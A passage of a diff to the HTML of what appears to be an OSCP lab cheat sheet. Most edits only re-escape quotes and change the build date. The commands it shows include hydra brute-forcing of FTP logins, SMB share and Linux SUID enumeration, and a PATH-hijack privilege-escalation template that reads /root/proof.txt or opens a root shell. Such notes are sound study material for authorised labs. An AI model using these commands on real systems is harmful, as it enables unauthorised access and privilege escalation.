+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>ftp<span class="w"> </span>-n<span class="w"> </span>-v<span class="w"> </span><span class="nv">$T</span><span class="w"> </span><span class="o">&lt;&lt;&lt;</span><span class="w"> </span><span class="s1">$&#39;user anonymous anon@test\nls\nbye&#39;</span><span class="w">    </span><span class="c1"># 530 right after USER =&gt; anonymous off</span>
 
 hydra<span class="w"> </span>-L<span class="w"> </span>users.txt<span class="w"> </span>-P<span class="w"> </span>pass.txt<span class="w"> </span>-t<span class="w"> </span><span class="m">4</span><span class="w"> </span>-f<span class="w"> </span>-V<span class="w"> </span>ftp://<span class="nv">$T</span><span class="w">       </span><span class="c1"># -t 4 keeps vsftpd happy</span>
 
-curl<span class="w"> </span>-s<span class="w"> </span>-u<span class="w"> </span>user:pass<span class="w"> </span><span class="s2">"ftp://</span><span class="nv">$T</span><span class="s2">/"</span><span class="w">                         </span><span class="c1"># list</span>
-curl<span class="w"> </span>-s<span class="w"> </span>-u<span class="w"> </span>user:pass<span class="w"> </span>-o<span class="w"> </span>file<span class="w"> </span><span class="s2">"ftp://</span><span class="nv">$T</span><span class="s2">/file"</span><span class="w">             </span>#<span class="w"> </span>download
+curl<span class="w"> </span>-s<span class="w"> </span>-u<span class="w"> </span>user:pass<span class="w"> </span><span class="s2">&quot;ftp://</span><span class="nv">$T</span><span class="s2">/&quot;</span><span class="w">                         </span><span class="c1"># list</span>
+curl<span class="w"> </span>-s<span class="w"> </span>-u<span class="w"> </span>user:pass<span class="w"> </span>-o<span class="w"> </span>file<span class="w"> </span><span class="s2">&quot;ftp://</span><span class="nv">$T</span><span class="s2">/file&quot;</span><span class="w">             </span>#<span class="w"> </span>download
 </pre></div>
 <hr />
 <h3>SSH</h3>
@@ -1647,29 +2341,29 @@ curl<span class="w"> </span>-s<span class="w"> </span>-u<span class="w"> </span>
 <span class="c1">## BatchMode=yes so it never hangs on a password prompt</span>
 ssh<span class="w"> </span>-i<span class="w"> </span>id_rsa<span class="w"> </span>-o<span class="w"> </span><span class="nv">BatchMode</span><span class="o">=</span>yes<span class="w"> </span>-o<span class="w"> </span><span class="nv">StrictHostKeyChecking</span><span class="o">=</span>no<span class="w"> </span>user@<span class="nv">$T</span><span class="w"> </span>id
 
-sshpass<span class="w"> </span>-p<span class="w"> </span><span class="s1">'pass'</span><span class="w"> </span>ssh<span class="w"> </span>-o<span class="w"> </span><span class="nv">PreferredAuthentications</span><span class="o">=</span>password<span class="w"> </span><span class="se">\</span>
+sshpass<span class="w"> </span>-p<span class="w"> </span><span class="s1">&#39;pass&#39;</span><span class="w"> </span>ssh<span class="w"> </span>-o<span class="w"> </span><span class="nv">PreferredAuthentications</span><span class="o">=</span>password<span class="w"> </span><span class="se">\</span>
 <span class="w">  </span>-o<span class="w"> </span><span class="nv">PubkeyAuthentication</span><span class="o">=</span>no<span class="w"> </span>user@<span class="nv">$T</span><span class="w"> </span>id
 
 <span class="c1">## run a whole enumeration script in one connection</span>
-ssh<span class="w"> </span>-i<span class="w"> </span>id_rsa<span class="w"> </span>user@<span class="nv">$T</span><span class="w"> </span><span class="s1">'bash -s'</span><span class="w"> </span>&lt;<span class="w"> </span>enum.sh
+ssh<span class="w"> </span>-i<span class="w"> </span>id_rsa<span class="w"> </span>user@<span class="nv">$T</span><span class="w"> </span><span class="s1">&#39;bash -s&#39;</span><span class="w"> </span>&lt;<span class="w"> </span>enum.sh
 </pre></div>
 <hr />
 <h3>SMB</h3>
-<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>nxc<span class="w"> </span>smb<span class="w"> </span><span class="nv">$T</span><span class="w"> </span>-u<span class="w"> </span><span class="s1">''</span><span class="w"> </span>-p<span class="w"> </span><span class="s1">''</span><span class="w"> </span>--shares
-nxc<span class="w"> </span>smb<span class="w"> </span><span class="nv">$T</span><span class="w"> </span>-u<span class="w"> </span>guest<span class="w"> </span>-p<span class="w"> </span><span class="s1">''</span><span class="w"> </span>--shares
-nxc<span class="w"> </span>smb<span class="w"> </span><span class="nv">$T</span><span class="w"> </span>-u<span class="w"> </span>user<span class="w"> </span>-p<span class="w"> </span><span class="s1">'pass'</span><span class="w"> </span>-d<span class="w"> </span>DOMAIN<span class="w"> </span>--shares
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>nxc<span class="w"> </span>smb<span class="w"> </span><span class="nv">$T</span><span class="w"> </span>-u<span class="w"> </span><span class="s1">&#39;&#39;</span><span class="w"> </span>-p<span class="w"> </span><span class="s1">&#39;&#39;</span><span class="w"> </span>--shares
+nxc<span class="w"> </span>smb<span class="w"> </span><span class="nv">$T</span><span class="w"> </span>-u<span class="w"> </span>guest<span class="w"> </span>-p<span class="w"> </span><span class="s1">&#39;&#39;</span><span class="w"> </span>--shares
+nxc<span class="w"> </span>smb<span class="w"> </span><span class="nv">$T</span><span class="w"> </span>-u<span class="w"> </span>user<span class="w"> </span>-p<span class="w"> </span><span class="s1">&#39;pass&#39;</span><span class="w"> </span>-d<span class="w"> </span>DOMAIN<span class="w"> </span>--shares
 
-smbclient<span class="w"> </span>//<span class="nv">$T</span>/share<span class="w"> </span>-U<span class="w"> </span><span class="s1">'DOMAIN/user%pass'</span><span class="w"> </span>-c<span class="w"> </span><span class="s1">'recurse; ls'</span>
-smbclient<span class="w"> </span>//<span class="nv">$T</span>/share<span class="w"> </span>-U<span class="w"> </span><span class="s1">'DOMAIN/user%pass'</span><span class="w"> </span>-c<span class="w"> </span><span class="s1">'get file.txt'</span>
+smbclient<span class="w"> </span>//<span class="nv">$T</span>/share<span class="w"> </span>-U<span class="w"> </span><span class="s1">&#39;DOMAIN/user%pass&#39;</span><span class="w"> </span>-c<span class="w"> </span><span class="s1">&#39;recurse; ls&#39;</span>
+smbclient<span class="w"> </span>//<span class="nv">$T</span>/share<span class="w"> </span>-U<span class="w"> </span><span class="s1">&#39;DOMAIN/user%pass&#39;</span><span class="w"> </span>-c<span class="w"> </span><span class="s1">&#39;get file.txt&#39;</span>
 </pre></div>
 <hr />
 <h3>Linux local enumeration</h3>
 <div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>id<span class="p">;</span><span class="w"> </span>hostname<span class="p">;</span><span class="w"> </span>sudo<span class="w"> </span>-n<span class="w"> </span>-l<span class="p">;</span><span class="w"> </span>uname<span class="w"> </span>-a
 
 <span class="c1">## SUID without tripling the output on snap</span>
-find<span class="w"> </span>/<span class="w"> </span>-perm<span class="w"> </span>-4000<span class="w"> </span>-type<span class="w"> </span>f<span class="w"> </span><span class="m">2</span>&gt;/dev/null<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>-v<span class="w"> </span><span class="s1">'^/snap'</span>
+find<span class="w"> </span>/<span class="w"> </span>-perm<span class="w"> </span>-4000<span class="w"> </span>-type<span class="w"> </span>f<span class="w"> </span><span class="m">2</span>&gt;/dev/null<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>-v<span class="w"> </span><span class="s1">&#39;^/snap&#39;</span>
 
-find<span class="w"> </span>/<span class="w"> </span>-perm<span class="w"> </span>-2000<span class="w"> </span>-type<span class="w"> </span>f<span class="w"> </span><span class="m">2</span>&gt;/dev/null<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>-v<span class="w"> </span><span class="s1">'^/snap'</span><span class="w">    </span><span class="c1"># setgid</span>
+find<span class="w"> </span>/<span class="w"> </span>-perm<span class="w"> </span>-2000<span class="w"> </span>-type<span class="w"> </span>f<span class="w"> </span><span class="m">2</span>&gt;/dev/null<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>-v<span class="w"> </span><span class="s1">&#39;^/snap&#39;</span><span class="w">    </span><span class="c1"># setgid</span>
 getcap<span class="w"> </span>-r<span class="w"> </span>/<span class="w"> </span><span class="m">2</span>&gt;/dev/null
 cat<span class="w"> </span>/etc/crontab<span class="p">;</span><span class="w"> </span>ls<span class="w"> </span>-la<span class="w"> </span>/etc/cron.*
 ss<span class="w"> </span>-tlnp
@@ -1678,10 +2372,10 @@ find<span class="w"> </span>/<span class="w"> </span>-name<span class="w"> </spa
 </pre></div>
 <hr />
 <h3>Binary analysis</h3>
-<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>file<span class="w"> </span>bin<span class="w">                                  </span><span class="c1"># "not stripped" = function names survive</span>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>file<span class="w"> </span>bin<span class="w">                                  </span><span class="c1"># &quot;not stripped&quot; = function names survive</span>
 strings<span class="w"> </span>-a<span class="w"> </span>bin<span class="w"> </span><span class="p">|</span><span class="w"> </span>head<span class="w"> </span>-40<span class="w">                 </span><span class="c1"># system / popen / exec / bare command names</span>
-objdump<span class="w"> </span>-d<span class="w"> </span>-M<span class="w"> </span>intel<span class="w"> </span>bin<span class="w"> </span><span class="p">|</span><span class="w"> </span>sed<span class="w"> </span>-n<span class="w"> </span><span class="s1">'/&lt;main&gt;:/,/^$/p'</span>
-readelf<span class="w"> </span>-d<span class="w"> </span>bin<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>-E<span class="w"> </span><span class="s1">'BIND_NOW|FLAGS'</span><span class="w"> </span><span class="c1"># full RELRO =&gt; forget GOT overwrite</span>
+objdump<span class="w"> </span>-d<span class="w"> </span>-M<span class="w"> </span>intel<span class="w"> </span>bin<span class="w"> </span><span class="p">|</span><span class="w"> </span>sed<span class="w"> </span>-n<span class="w"> </span><span class="s1">&#39;/&lt;main&gt;:/,/^$/p&#39;</span>
+readelf<span class="w"> </span>-d<span class="w"> </span>bin<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>-E<span class="w"> </span><span class="s1">&#39;BIND_NOW|FLAGS&#39;</span><span class="w"> </span><span class="c1"># full RELRO =&gt; forget GOT overwrite</span>
 objdump<span class="w"> </span>-s<span class="w"> </span>-j<span class="w"> </span>.rodata<span class="w"> </span>bin<span class="w"> </span><span class="p">|</span><span class="w"> </span>head<span class="w">          </span>#<span class="w"> </span>resolve<span class="w"> </span>the<span class="w"> </span>strings<span class="w"> </span>passed<span class="w"> </span>to<span class="w"> </span>system<span class="o">()</span>
 </pre></div>
 <p>Reconstructing source from a small binary:</p>
@@ -1691,37 +2385,37 @@ objdump<span class="w"> </span>-s<span class="w"> </span>-j<span class="w"> </sp
 <hr />
 <h3>Privesc — PATH hijack template</h3>
 <div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre><span class="nv">D</span><span class="o">=</span><span class="k">$(</span>mktemp<span class="w"> </span>-d<span class="w"> </span>/tmp/x.XXXXXX<span class="k">)</span>
-cat<span class="w"> </span>&gt;<span class="w"> </span><span class="s2">"</span><span class="nv">$D</span><span class="s2">/chpasswd"</span><span class="w"> </span><span class="s">&lt;&lt;'EOF'</span>
+cat<span class="w"> </span>&gt;<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$D</span><span class="s2">/chpasswd&quot;</span><span class="w"> </span><span class="s">&lt;&lt;&#39;EOF&#39;</span>
 <span class="s">#!/bin/bash</span>
 <span class="s">id &gt; /tmp/root_id.txt</span>
 <span class="s">cat /root/proof.txt &gt; /tmp/root_proof.txt 2&gt;&amp;1</span>
 <span class="s">chmod 644 /tmp/root_id.txt /tmp/root_proof.txt</span>
 <span class="s">EOF</span>
-chmod<span class="w"> </span>+x<span class="w"> </span><span class="s2">"</span><span class="nv">$D</span><span class="s2">/chpasswd"</span>
+chmod<span class="w"> </span>+x<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$D</span><span class="s2">/chpasswd&quot;</span>
 
 <span class="c1">## name the faked binary exactly as the SUID program invokes it</span>
-<span class="nv">PATH</span><span class="o">=</span><span class="s2">"</span><span class="nv">$D</span><span class="s2">:</span><span class="nv">$PATH</span><span class="s2">"</span><span class="w"> </span>/path/to/suid_binary
+<span class="nv">PATH</span><span class="o">=</span><span class="s2">&quot;</span><span class="nv">$D</span><span class="s2">:</span><span class="nv">$PATH</span><span class="s2">&quot;</span><span class="w"> </span>/path/to/suid_binary
 
 cat<span class="w"> </span>/tmp/root_id.txt
 </pre></div>
 <p>Works only when the SUID binary calls <code>setuid(0)</code>/<code>seteuid(0)</code> <strong>before</strong> <code>system()</code>. If it does
 not, the shell drops privileges and the payload runs as you. Check the disassembly order first.</p>
 <p>Interactive variant:</p>
-<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre><span class="nb">printf</span><span class="w"> </span><span class="s1">'#!/bin/bash\n/bin/bash -p\n'</span><span class="w"> </span>&gt;<span class="w"> </span><span class="s2">"</span><span class="nv">$D</span><span class="s2">/chpasswd"</span><span class="p">;</span><span class="w"> </span>chmod<span class="w"> </span>+x<span class="w"> </span><span class="s2">"</span><span class="nv">$D</span><span class="s2">/chpasswd"</span>
-<span class="nv">PATH</span><span class="o">=</span><span class="s2">"</span><span class="nv">$D</span><span class="s2">:</span><span class="nv">$PATH</span><span class="s2">"</span><span class="w"> </span>/path/to/suid_binary
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre><span class="nb">printf</span><span class="w"> </span><span class="s1">&#39;#!/bin/bash\n/bin/bash -p\n&#39;</span><span class="w"> </span>&gt;<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$D</span><span class="s2">/chpasswd&quot;</span><span class="p">;</span><span class="w"> </span>chmod<span class="w"> </span>+x<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$D</span><span class="s2">/chpasswd&quot;</span>
+<span class="nv">PATH</span><span class="o">=</span><span class="s2">&quot;</span><span class="nv">$D</span><span class="s2">:</span><span class="nv">$PATH</span><span class="s2">&quot;</span><span class="w"> </span>/path/to/suid_binary
 </pre></div>
 <hr />
 <h3>Cleanup</h3>
 <div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre><span class="nv">D</span><span class="o">=</span><span class="k">$(</span>mktemp<span class="w"> </span>-d<span class="w"> </span>/tmp/c.XXXXXX<span class="k">)</span>
-<span class="nb">printf</span><span class="w"> </span><span class="s1">'#!/bin/bash\nrm -f /tmp/root_id.txt /tmp/root_proof.txt; rm -rf /tmp/x.*\n'</span><span class="w"> </span>&gt;<span class="w"> </span><span class="s2">"</span><span class="nv">$D</span><span class="s2">/chpasswd"</span>
-chmod<span class="w"> </span>+x<span class="w"> </span><span class="s2">"</span><span class="nv">$D</span><span class="s2">/chpasswd"</span>
-<span class="nv">PATH</span><span class="o">=</span><span class="s2">"</span><span class="nv">$D</span><span class="s2">:</span><span class="nv">$PATH</span><span class="s2">"</span><span class="w"> </span>/path/to/suid_binary
-ls<span class="w"> </span>-la<span class="w"> </span>/tmp/root_id.txt<span class="w">        </span>#<span class="w"> </span>must<span class="w"> </span>be<span class="w"> </span><span class="s2">"No such file or directory"</span>
+<span class="nb">printf</span><span class="w"> </span><span class="s1">&#39;#!/bin/bash\nrm -f /tmp/root_id.txt /tmp/root_proof.txt; rm -rf /tmp/x.*\n&#39;</span><span class="w"> </span>&gt;<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$D</span><span class="s2">/chpasswd&quot;</span>
+chmod<span class="w"> </span>+x<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$D</span><span class="s2">/chpasswd&quot;</span>
+<span class="nv">PATH</span><span class="o">=</span><span class="s2">&quot;</span><span class="nv">$D</span><span class="s2">:</span><span class="nv">$PATH</span><span class="s2">&quot;</span><span class="w"> </span>/path/to/suid_binary
+ls<span class="w"> </span>-la<span class="w"> </span>/tmp/root_id.txt<span class="w">        </span>#<span class="w"> </span>must<span class="w"> </span>be<span class="w"> </span><span class="s2">&quot;No such file or directory&quot;</span>
 </pre></div></div></section>
 
     <footer>
       <span>Authorised lab environment · flags and credentials are lab-specific</span>
-      <span><a href="https://github.com/AV10V/OSCP">source on GitHub</a> · built 24 November 2026</span>
+      <span><a href="https://github.com/AV10V/OSCP">source on GitHub</a> · built 25 November 2026</span>
     </footer>
   </main>
 </div>
